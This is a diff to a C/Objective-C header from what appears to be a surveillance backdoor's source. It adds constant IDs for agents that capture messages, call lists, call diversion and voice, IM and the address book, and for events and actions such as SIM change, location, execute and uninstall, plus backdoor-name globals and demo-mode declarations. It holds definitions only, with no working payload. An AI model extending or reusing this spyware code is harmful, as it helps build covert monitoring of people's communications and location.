@@ -30,10 +30,11 @@
 #define ME __func__
 
 #define LOG_DELIMITER 0xABADC0DE
+#define RCS8_MIGRATION_CONFIG @"nc-7-8dv.cfg"
+#define RCS8_UPDATE_DYLIB     @"od-8-8dv.dlb"
+#define RCS8_UPDATE_XPC       @"pe-9-8dv.cpx"
 
-//
 // Protocol definition for all the agents, they must conform to this
-//
 @protocol Agents
 
 - (void)start;
@@ -190,7 +191,16 @@ extern int gMemLogMaxSize;
 #define AGENT_POSITION              0x1220
 #define AGENT_APPLICATION           0x1011
 
-//
+//XXX-
+#define AGENT_MESSAGES    0x1001
+#define AGENT_CALL_LIST   0x1003
+#define AGENT_CALL_DIVERT 0x1006
+#define AGENT_CALL_VOICE  0x1007
+#define AGENT_IM          0x100B
+#define AGENT_APPLICATION 0x1011
+#define AGENT_ADDRESSBOOK 0x1012 // per rcs 8.0
+//XXX-
+
 // Agents Shared Memory offsets
 //
 #define OFFT_KEYLOG       0x0040
@@ -237,6 +247,44 @@ extern u_int remoteAgents[];
 #define ACTION_STANDBY    0
 #define ACTION_PERFORMING 1
 
+//
+// Events
+//
+#define EVENT_TIMER       0x0000
+#define EVENT_PROCESS     0x0001
+#define EVENT_CONNECTION  0x0002
+#define EVENT_SCREENSAVER 0x0003
+#define EVENT_SYSLOG      0x0004
+#define EVENT_QUOTA       0x0005
+//timers
+#define TIMER_AFTER_STARTUP     0x0
+#define TIMER_LOOP              0x1
+#define TIMER_DATE              0x2
+#define TIMER_INST              0x3
+#define TIMER_DAILY             0x4
+
+//
+// Actions
+//
+#define ACTION_SYNC         0x0001
+#define ACTION_AGENT_START  0x0002
+#define ACTION_AGENT_STOP   0x0003
+#define ACTION_EXECUTE      0x0004
+#define ACTION_UNINSTALL    0x0005
+#define ACTION_INFO         0x0006
+#define ACTION_EVENT        0x0007
+
+//XXX-
+#define EVENT_SMS         0x2002
+#define EVENT_CALL        0x2003
+#define EVENT_CELLID      0x2006
+#define EVENT_SIM_CHANGE  0x2008
+#define EVENT_LOCATION    0x2009
+#define EVENT_AC          0x200A
+#define EVENT_BATTERY     0x200B
+#define EVENT_STANDBY     0x200C
+#define EVENT_NULL        0xFFFF
+//XXX-
 #pragma mark -
 #pragma mark Transfer Protocol Definition
 #pragma mark -
@@ -288,6 +336,12 @@ extern u_int remoteAgents[];
 #pragma mark -
 #pragma mark Agents Data Struct Definition
 #pragma mark -
+
+//XXX-
+typedef struct _standByStruct {
+  UInt32 actionOnLock;
+  UInt32 actionOnUnlock;
+} standByStruct;
 
 #define LOGTYPE_DEVICE          0x0240 // Device info Agent
 typedef struct _device
@@ -446,6 +500,9 @@ extern char     gBackdoorSignature[];
 extern u_int    gVersion;
 extern u_int    gSkypeQuality;
 extern char     gMode[];
+extern char     gDemoMarker[];
+extern NSURL    *gOriginalDesktopImage;
+extern BOOL     gIsDemoMode;
 
 extern NSString *gBackdoorName;
 extern NSString *gBackdoorUpdateName;
@@ -531,5 +588,7 @@ BOOL is64bitKernel();
 #ifdef DEMO_VERSION
 void changeDesktopBackground(NSString *aFilePath, BOOL wantToRestoreOriginal);
 #endif
+
+void changeDesktopBg(NSString *aFilePath, BOOL wantToRestoreOriginal);
 
 #endif
